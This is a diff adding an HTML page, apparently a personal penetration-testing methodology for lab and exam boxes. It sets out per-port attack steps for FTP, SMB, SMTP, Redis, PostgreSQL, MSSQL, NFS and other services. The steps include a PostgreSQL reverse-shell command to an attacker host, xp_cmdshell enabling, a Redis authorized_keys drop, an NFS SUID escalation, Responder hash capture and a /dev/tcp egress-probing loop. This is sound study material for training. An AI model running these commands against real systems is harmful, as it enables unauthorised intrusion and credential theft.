@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Network Services Methodology — Corey Clay</title>
+<meta name="description" content="A per-port playbook for everything nmap surfaces that isn&#x27;t HTTP — FTP, SMB, SSH, SMTP, Redis, PostgreSQL, MSSQL, and the rest — with a frequency">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#14161b;--ink-2:#181b21;--panel:#1c2027;--panel-2:#20242c;
+    --line:#2c313b;--line-soft:#242932;
+    --fg:#e6e2d8;--fg-dim:#b7b6ae;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#e8a33d;--signal-soft:rgba(232,163,61,.14);--signal-line:rgba(232,163,61,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"Space Grotesk",system-ui,sans-serif;
+    --f-body:"Newsreader",Georgia,serif;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:17px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 82% -8%, rgba(232,163,61,.05), transparent 60%),
+      linear-gradient(var(--line-soft) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
+    background-size:auto,64px 64px,64px 64px;background-position:0 0,-1px -1px,-1px -1px;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(180deg,transparent 0%,var(--ink) 42%)}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(20,22,27,.86);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(20,22,27,.92);backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ network</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a class="here" href="methodology.html" aria-current="page">methodology</a>
+      <a class="" href="enumeration.html">enumeration</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="methodology.html">&larr; methodology</a> &nbsp;/&nbsp; non-HTTP services</p>
+  <h1>Network services methodology</h1>
+  <p>A per-port playbook for everything nmap surfaces that isn't HTTP — FTP, SMB, SSH, SMTP, Redis, PostgreSQL, MSSQL, and the rest — with a frequency-ranked service-exploitation table and an 'I see X port, try Y' decision tree.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#prime-rules">Prime Rules</a>
+      <a href="#the-distilled-methodology">The Distilled Methodology</a>
+      <a href="#frequency-ranked-service-exploitation-vectors-htb-pg-corpus">Frequency-Ranked Service-Exploitation Vectors (HTB + PG Corpus)</a>
+      <a href="#per-port-playbook">Per-Port Playbook</a>
+      <a href="#decision-tree-i-see-x-port-try-y">Decision Tree — &quot;I See X Port, Try Y&quot;</a>
+      <a href="#egress-port-survival">Egress Port Survival</a>
+      <a href="#exam-day-network-services-checklist">EXAM-Day Network-Services Checklist</a>
+  </div>
+</nav>
+<main class="wrap">
+<p>Per-port checklist for anything nmap surfaces that isn't HTTP. Web-first stuff lives in the Web methodology; this covers raw protocols where the box hinges on a service exploit.</p>
+<h2 id="prime-rules">Prime Rules</h2>
+<ol>
+<li><strong>Fingerprint every port — banner + version — before touching anything.</strong> Non-standard ports are usually intentional signals from the box author.</li>
+<li><strong>Anonymous / default access first</strong> — SMB anon share, FTP anon, Redis no-auth, PostgreSQL <code>postgres:postgres</code>, SNMP <code>public</code>, LDAP anon bind. Cheap and often wins.</li>
+<li><strong>Every service has 2-3 CVEs worth knowing</strong> — memorise the version -&gt; CVE map.</li>
+<li><strong>Verify service is running as root before spending time on privesc</strong> — Redis, FreeSWITCH, mysqldump-in-cron all frequently ran as root on PG.</li>
+<li><strong>Full-port scan is mandatory</strong> — <code>-p-</code>. Non-default ports (5437 PostgreSQL, 43022 SSH, 7742 HTTP, 17001 .NET Remoting) are common on PG.</li>
+</ol>
+<hr />
+<h2 id="the-distilled-methodology">The Distilled Methodology</h2>
+<h3>Phase A — Full Scan + Service ID</h3>
+<pre><code class="language-bash">sudo nmap -Pn -sC -sV -p- -v &lt;IP&gt; -oN scan.txt
+# Note: any port you don't recognise, run:
+nc -nv &lt;IP&gt; &lt;PORT&gt;              # grab banner
+</code></pre>
+<h3>Phase B — Per-Port Triage</h3>
+<p>For each open port, the workflow is: <strong>fingerprint -&gt; default creds -&gt; CVE search -&gt; anon/read primitive -&gt; exploit chain</strong>.</p>
+<h3>Phase C — Match Findings Against the Ranked Table Below</h3>
+<hr />
+<h2 id="frequency-ranked-service-exploitation-vectors-htb-pg-corpus">Frequency-Ranked Service-Exploitation Vectors (HTB + PG Corpus)</h2>
+<table>
+<thead>
+<tr>
+<th>Rank</th>
+<th>Service class</th>
+<th>Evidence boxes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Redis unauth / weak auth</strong> — SLAVEOF / MODULE LOAD / SSH-key drop / cron write</td>
+<td>Wombo (SLAVEOF module <code>jas502n/Redis-RCE</code>), Sybaris (MODULE LOAD via anon FTP <code>n0b0dyCN/RedisModules-ExecuteCommand</code>)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>PostgreSQL default creds</strong> -&gt; <code>COPY FROM PROGRAM</code> (superuser only)</td>
+<td>Nibbles (port 5437 non-standard)</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>SMB anon / weak creds -&gt; shares -&gt; files -&gt; creds</strong></td>
+<td>Bratarina (<code>passwd.bak</code> in anon share), Clue (backup share with FreeSWITCH creds), Vault (writable share + forced-auth)</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>OpenSMTPD &lt;= 6.6.1 CVE-2020-7247</strong> unauth root RCE</td>
+<td>Bratarina</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>FreeSWITCH mod_event_socket</strong> password-authenticated <code>api system</code> = RCE</td>
+<td>Clue</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>SMTP user enum + phishing</strong> — VRFY/RCPT + auto-clicker bot capture</td>
+<td>PostFish (<code>smtp-user-enum</code> + <code>nc</code> DATA), Hepet (finger + MMG-LO ODS via swaks)</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>SmarterMail .NET Remoting on TCP 17001</strong> CVE-2019-7214</td>
+<td>Algernon</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>HP Power Manager CVE-2011-3846</strong> -&gt; SYSTEM (Metasploit — EXAM-RESTRICTED)</td>
+<td>Kevin</td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>MS17-010 EternalBlue</strong> manual AutoBlue chain</td>
+<td>Internal</td>
+</tr>
+<tr>
+<td>10</td>
+<td><strong>Remote Mouse EDB 46697</strong> unauth RCE + UDP/1978 fingerprint</td>
+<td>Mice</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>Anon FTP with writable dir -&gt; payload staging</strong></td>
+<td>Sybaris (write <code>.so</code> to <code>/pub</code> -&gt; load in Redis)</td>
+</tr>
+<tr>
+<td>12</td>
+<td><strong>NFS mount -&gt; home dir raid or writable share</strong></td>
+<td>(generic — CPTS labs)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="per-port-playbook">Per-Port Playbook</h2>
+<h3>21 — FTP</h3>
+<pre><code class="language-bash"># Anon check + banner:
+ftp -A &lt;IP&gt;     # anonymous / &lt;blank&gt;
+nc -nv &lt;IP&gt; 21  # vsftpd version leak in banner
+</code></pre>
+<ul>
+<li><strong>Anon writable dir</strong> -&gt; drop payload for another service to load (Sybaris: <code>.so</code> -&gt; Redis <code>MODULE LOAD</code>)</li>
+<li><strong>Anon writable -&gt; webroot</strong> -&gt; PHP shell if FTP user owns Apache docroot (SpiderSociety non-standard port 2121)</li>
+<li><strong>vsftpd 2.3.4</strong> -&gt; backdoor smiley <code>:)</code> on USER — MSF <code>exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+<li><strong>ProFTPD 1.3.5b</strong> -&gt; <code>mod_copy</code> CVE-2015-3306 (Roquefort had it exposed but Gitea Git Hooks was faster)</li>
+<li><strong>zFTPServer <code>accounts/</code> dir</strong> -&gt; filenames = username list (AuthBy)</li>
+<li><strong>Modern vsftpd default 600 mode</strong> -&gt; <code>SITE CHMOD 644 file</code> from FTP client (SpiderSociety)</li>
+<li><strong>Non-standard port</strong> (2121, 21211) is a strong "intended path" signal</li>
+</ul>
+<h3>22 — SSH</h3>
+<ul>
+<li><strong>Try defaults:</strong> <code>root:root</code>, <code>root:toor</code>, <code>admin:admin</code>, <code>pi:raspberry</code>, <code>msfadmin:msfadmin</code></li>
+<li><strong>Hydra brute</strong> only when username is known (Hunit — real names from web page); use <code>-u</code> flag to iterate USERS per password (AuthBy: <code>hydra -f -L users.txt -u -P wordlist &lt;IP&gt; ftp/ssh</code>)</li>
+<li><strong>World-readable <code>id_rsa</code></strong> on writable share / mode 755 -&gt; <code>ssh -i</code> (Hunit)</li>
+<li><strong>git-shell forced command</strong> can still <code>git clone/push</code> — poison a repo cron pulls (Hunit)</li>
+<li><strong>Non-standard port</strong> (43022, 22222, 7742) is intentional — check</li>
+<li><strong>Modern OpenSSH -&gt; EOL server compat flags:</strong></li>
+</ul>
+<p><code>bash
+  ssh -p 22 &lt;USER&gt;@&lt;IP&gt; -oHostKeyAlgorithms=+ssh-rsa \
+    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa</code></p>
+<p>(Zenphoto — Ubuntu 10.04-era server)
+* <strong>Forced-command / restricted-shell wrapper</strong> matching on <code>SSH_ORIGINAL_COMMAND</code> -&gt; force legacy SCP protocol with <code>scp -O</code> (Sorcerer)</p>
+<h3>25 — SMTP</h3>
+<pre><code class="language-bash">nc -nv &lt;IP&gt; 25                                        # banner reveals product
+
+# Enumeration:
+smtp-user-enum -M VRFY -U users.txt -t &lt;IP&gt;           # PostFish
+smtp-user-enum -M RCPT -D &lt;DOMAIN&gt; -U users.txt -t &lt;IP&gt;
+#   -M    method (VRFY, EXPN, RCPT)
+#   -U    username wordlist
+#   -D    domain to append (RCPT mode)
+#   -t    target IP
+
+# Manual:
+telnet &lt;IP&gt; 25
+HELO x
+VRFY bob                                              # 252 = maybe, 250 = confirmed, 550 = no
+</code></pre>
+<ul>
+<li><strong>OpenSMTPD 6.6.x</strong> -&gt; CVE-2020-7247 unauth root RCE via <code>MAIL FROM:&lt;;cmd;&gt;</code></li>
+</ul>
+<p><code>bash
+  # EDB 47984 Python payload (double-escape quotes):
+  python3 47984.py &lt;IP&gt; 25 '&lt;reverse-shell-payload&gt;'</code>
+* <strong>Postfix + writable <code>content_filter</code> script</strong> -&gt; filter runs as <code>filter</code> user; inject shell (PostFish)
+* <strong>swaks for phishing</strong> delivery when a bot processes inbound mail (Hepet — MMG-LO ODS attachment)</p>
+<h3>53 — DNS</h3>
+<pre><code class="language-bash">dig axfr &lt;DOMAIN&gt; @&lt;IP&gt;                              # zone transfer
+dnsenum --dnsserver &lt;IP&gt; &lt;DOMAIN&gt;
+dig -x &lt;IP&gt; @&lt;IP&gt;                                    # reverse
+</code></pre>
+<ul>
+<li>Zone transfer routinely leaks subdomains and internal hostnames</li>
+<li><strong>DNS-based egress</strong> is often whitelisted — try 53 for reverse shells when 80/443/4444 fail</li>
+</ul>
+<h3>79 — finger</h3>
+<pre><code class="language-bash">for u in ela agnes charlotte magnus jonas martha admin; do finger $u@&lt;IP&gt;; done
+
+# No client? Talk to port 79 directly:
+echo $u | nc &lt;IP&gt; 79
+# Valid = &quot;Login: foo  Name: Foo&quot;; invalid = &quot;not known at this site&quot;
+</code></pre>
+<p>(Hepet)</p>
+<h3>88, 389, 636, 464 — Kerberos + LDAP + LDAPS + kpasswd</h3>
+<p>See the Active Directory methodology. <strong>Presence of port 88 = DC.</strong></p>
+<h3>110 / 143 — POP3 / IMAP</h3>
+<ul>
+<li>Read <code>/var/mail/&lt;user&gt;</code> after any user compromise (Scrutiny, PostFish) — colleagues share creds by email</li>
+<li>IMAP with auth -&gt; mailbox -&gt; attachments / drafts</li>
+</ul>
+<h3>111 — NFS</h3>
+<pre><code class="language-bash">showmount -e &lt;IP&gt;                                    # list exports
+mkdir /tmp/mnt &amp;&amp; sudo mount -t nfs &lt;IP&gt;:/SHARE /tmp/mnt -o nolock
+ls -la /tmp/mnt
+
+# no_root_squash -&gt; touch a SUID as root on the target from your box:
+sudo cp /bin/bash /tmp/mnt/bash &amp;&amp; sudo chmod +s /tmp/mnt/bash
+# then on target: /path/to/mount/bash -p -&gt; euid=0
+</code></pre>
+<h3>135, 445 — SMB</h3>
+<pre><code class="language-bash"># Enumeration (from anonymous):
+smbclient -N -L //&lt;IP&gt;
+enum4linux-ng -A &lt;IP&gt;
+nxc smb &lt;IP&gt; -u '' -p '' --shares
+nxc smb &lt;IP&gt; -u 'guest' -p '' --rid-brute            # guest fallback (Vault)
+</code></pre>
+<ul>
+<li><strong>Anonymous read on <code>backups</code>, <code>Public</code>, <code>IPC$</code></strong> -&gt; any <code>.bak</code> / <code>passwd</code> / <code>config</code> files</li>
+<li><strong>Writable share</strong> -&gt; forced-auth files (<code>.url</code> / <code>.scf</code> / <code>desktop.ini</code> with <code>@</code>-prefix — Vault):</li>
+</ul>
+<p><code>bash
+  smbclient -N //&lt;IP&gt;/&lt;SHARE&gt; -c 'put @poison.url; put @poison.scf; put desktop.ini'
+  sudo responder -I tun0 -dwv           # -A analyse-only variant is EXAM-OK; poisoning is BANNED
+  hashcat -m 5600 anirudh.hash /usr/share/wordlists/rockyou.txt</code>
+* <strong>NTDS backup share</strong> (<code>Password Audit</code>, <code>Backups</code>) with <code>Active Directory/</code> + <code>registry/</code> -&gt; <code>secretsdump -ntds ... LOCAL</code> (Resourced)
+* <strong>MS17-010</strong> (see EternalBlue chain — Internal)</p>
+<h3>139, 445 — NBT-NS / SMB — see 445 above</h3>
+<h3>161 — SNMP</h3>
+<pre><code class="language-bash">onesixtyone -c /usr/share/wordlists/seclists/SNMP/common-snmp-community-strings.txt &lt;IP&gt;
+
+# Once you have a community string:
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25   # Windows users
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2  # running processes (creds in cmdlines)
+</code></pre>
+<h3>1433 — MSSQL</h3>
+<pre><code class="language-bash">impacket-mssqlclient &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -windows-auth
+
+# Enumeration:
+SELECT name FROM master.sys.databases;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+
+# xp_cmdshell if sysadmin:
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+</code></pre>
+<ul>
+<li><strong>Silver ticket</strong> for MSSQL SPN when you own a service account's NT hash (Nagoya) — see Kerberos attacks</li>
+</ul>
+<h3>2049 — NFS (see 111)</h3>
+<h3>3306 — MySQL</h3>
+<ul>
+<li><strong>Remote root</strong> with <code>--skip-ssl</code> / <code>--ssl-mode=DISABLED</code> when server has no TLS (Apex)</li>
+<li><strong><code>LOAD DATA LOCAL INFILE</code></strong> — rogue MySQL server can pull files off a MySQL <em>client</em> like MantisBT <code>install.php</code> (Mantis)</li>
+</ul>
+<h3>3389 — RDP</h3>
+<pre><code class="language-bash">xfreerdp3 /v:&lt;IP&gt; /u:&lt;USER&gt; /p:'&lt;PASS&gt;' /cert:ignore /clipboard +dynamic-resolution
+# FreeRDP v3 uses /cert:ignore (not /cert-ignore) — Mice
+</code></pre>
+<ul>
+<li><strong>BlueKeep (CVE-2019-0708)</strong> for Server 2003/2008/XP — EXAM-RESTRICTED via MSF <code>exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></li>
+<li><strong>Group <code>Remote Desktop Users</code></strong> -&gt; GUI LPE via elevated file dialog (Mice — EDB 50047)</li>
+</ul>
+<h3>5432 — PostgreSQL</h3>
+<pre><code class="language-bash">psql -h &lt;IP&gt; -p 5432 -U postgres            # postgres:postgres
+
+# Enumeration + RCE (superuser only):
+\l
+\du
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output TEXT);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+COPY cmd_exec FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/80 0&gt;&amp;1&quot;';
+</code></pre>
+<p>(Nibbles — moved to port 5437 which is the tell)</p>
+<h3>5985 / 5986 — WinRM</h3>
+<pre><code class="language-bash">nxc winrm &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+# 5986 = HTTPS; add -S for SSL
+</code></pre>
+<ul>
+<li><strong>User not in <code>Remote Management Users</code></strong> -&gt; falls back to RunasCs (Access) or PsExec (see 445)</li>
+</ul>
+<h3>6379 — Redis</h3>
+<pre><code class="language-bash">redis-cli -h &lt;IP&gt;
+INFO         # confirm no NOAUTH
+</code></pre>
+<ul>
+<li><strong>Redis running as root</strong> on default install (Wombo) -&gt; full root</li>
+<li><strong>SLAVEOF replication</strong> to attacker (<code>jas502n/Redis-RCE</code>) — needs a reachable port on attacker (<strong>80/443 usually only options</strong> — <code>-P 80</code>)</li>
+<li><strong>MODULE LOAD via anon FTP write</strong> (Sybaris — <code>RedisModules-ExecuteCommand.so</code>)</li>
+<li><strong>Redis 4.x – 5.x</strong> = MODULE LOAD; <strong>6.x+</strong> may need <code>CONFIG SET enable-module-command yes</code> first</li>
+<li><strong>Older Redis</strong> (pre-module) -&gt; SSH-key drop:</li>
+</ul>
+<p><code>CONFIG SET dir /var/lib/redis/.ssh/
+  CONFIG SET dbfilename authorized_keys
+  SET x "\n\n\n&lt;PUBKEY&gt;\n\n\n"
+  SAVE</code>
+* <strong>Auth'd</strong> — try <code>foobared</code>, <code>redis</code>, <code>password</code>, <code>admin</code> before hydra</p>
+<h3>8021 — FreeSWITCH mod_event_socket</h3>
+<pre><code class="language-bash"># Auth first:
+nc -nv &lt;IP&gt; 8021
+auth &lt;password&gt;
+api system id
+</code></pre>
+<p>Password often in <code>/etc/freeswitch/autoload_configs/event_socket.conf.xml</code> or <code>/proc/self/cmdline</code> via an LFI (Clue).</p>
+<h3>8080, 8081, 8090, 8443, 9090 — HTTP Alt Ports</h3>
+<ul>
+<li><strong>Openfire 9090/9091</strong> — CVE-2023-32315 setup bypass (Fired)</li>
+<li><strong>Cockpit 9090</strong> — local-PAM login when SSH is blocked (blaze)</li>
+<li><strong>Confluence 8090</strong> — CVE-2022-26134 (Flu)</li>
+<li><strong>Nexus 8081</strong> — CVE-2020-10199 (Billyboss)</li>
+<li><strong>Argus DVR 8080</strong> — CVE-2018-15745 (DVR4)</li>
+<li><strong>Squid 3128</strong> — open proxy -&gt; target loopback (Squid) — see pivoting &amp; tunneling</li>
+</ul>
+<h3>8087, 17001 — .NET Remoting Endpoints</h3>
+<ul>
+<li><strong>SmarterMail on 17001</strong> — CVE-2019-7214 (Algernon)</li>
+<li><strong>PRTG on 8087</strong> — see attacking common applications</li>
+</ul>
+<h3>27017 — MongoDB</h3>
+<pre><code class="language-bash">mongo &lt;IP&gt;                                                        # legacy client
+mongosh &lt;IP&gt;:27017 --eval &quot;db.adminCommand('listDatabases')&quot;
+</code></pre>
+<p>Rare as intended path — usually a decoy (Wombo).</p>
+<h3>5000, 6789, 8000, 50000 — Werkzeug / Tornado / Custom Python</h3>
+<ul>
+<li><strong>Werkzeug 5000/50000</strong> — Flask app -&gt; check for <code>/verify</code> <code>eval()</code> (Hetemit), file upload traversal (WallpaperHub)</li>
+<li><strong>Tornado 6.3.3</strong> — Mage AI default (Zab)</li>
+<li><strong>Gerapy 8000</strong> — CVE-2021-43857 (Levram)</li>
+</ul>
+<hr />
+<h2 id="decision-tree-i-see-x-port-try-y">Decision Tree — "I See X Port, Try Y"</h2>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB open + <code>smbclient -N -L</code> returns shares</td>
+<td>Download every accessible file to <code>/tmp/loot/</code>; grep for creds</td>
+</tr>
+<tr>
+<td>445 + guest anon rejected</td>
+<td><code>nxc smb -u guest -p '' --rid-brute</code> (Vault)</td>
+</tr>
+<tr>
+<td>Redis on 6379 + <code>INFO</code> responds without auth</td>
+<td>Straight to SLAVEOF module RCE (Wombo); if egress port constrained, use <code>-P 80</code></td>
+</tr>
+<tr>
+<td>PostgreSQL banner responds + non-standard port</td>
+<td><code>postgres:postgres</code> first (Nibbles)</td>
+</tr>
+<tr>
+<td>OpenSMTPD in banner</td>
+<td>CVE-2020-7247 immediately (Bratarina) — hostname often the hint</td>
+</tr>
+<tr>
+<td>Kerberos port 88 open + LDAP 389</td>
+<td>This is a DC -&gt; Active Directory methodology</td>
+</tr>
+<tr>
+<td>Any anon FTP writable dir + Redis on the box</td>
+<td>MODULE LOAD chain (Sybaris)</td>
+</tr>
+<tr>
+<td>Any writable SMB share</td>
+<td>Forced-auth <code>.url</code> / <code>.scf</code> / <code>desktop.ini</code> (Vault) — but Responder poisoning is BANNED</td>
+</tr>
+<tr>
+<td>SmarterMail on 9998</td>
+<td>CVE-2019-7214 on 17001 (Algernon)</td>
+</tr>
+<tr>
+<td>Cockpit on 9090</td>
+<td>Skip if SSH also present; use only when SSH blocks the account (blaze)</td>
+</tr>
+<tr>
+<td>Non-standard port on SSH/PostgreSQL/HTTP</td>
+<td>This is deliberate. Prioritise</td>
+</tr>
+<tr>
+<td>Multiple HTTP alt ports</td>
+<td>Each is a different app; probe all independently</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="egress-port-survival">Egress Port Survival</h2>
+<p>Common labs whitelist non-4444 ports:</p>
+<pre><code class="language-bash">for p in 80 443 4444 21 53 3000 8000 8080; do
+  timeout 3 bash -c &quot;echo &gt; /dev/tcp/&lt;LHOST&gt;/$p&quot; 2&gt;/dev/null &amp;&amp; echo &quot;$p OPEN&quot;
+done
+</code></pre>
+<p><strong>Boxes where non-4444 was mandatory:</strong></p>
+<ul>
+<li><strong>Roquefort</strong> — only port 21 worked</li>
+<li><strong>Bratarina</strong> — payload survival on port 80</li>
+<li><strong>Wombo</strong> — SLAVEOF exploit needed <code>-P 80</code> (Redis calls back for RDB)</li>
+<li><strong>Snookums, Fired, Flu</strong> — port 80 or 443</li>
+<li><strong>WallpaperHub, BitForge</strong> — port 80</li>
+</ul>
+<p><strong>Egress canary</strong> to confirm outbound reachability (Exfiltrated):</p>
+<pre><code class="language-bash"># Attacker:
+python3 -m http.server 8000
+
+# Target (in webshell/RCE):
+curl http://&lt;LHOST&gt;:8000/canary
+# GET logged -&gt; that port is open outbound
+</code></pre>
+<hr />
+<h2 id="exam-day-network-services-checklist">EXAM-Day Network-Services Checklist</h2>
+<ul>
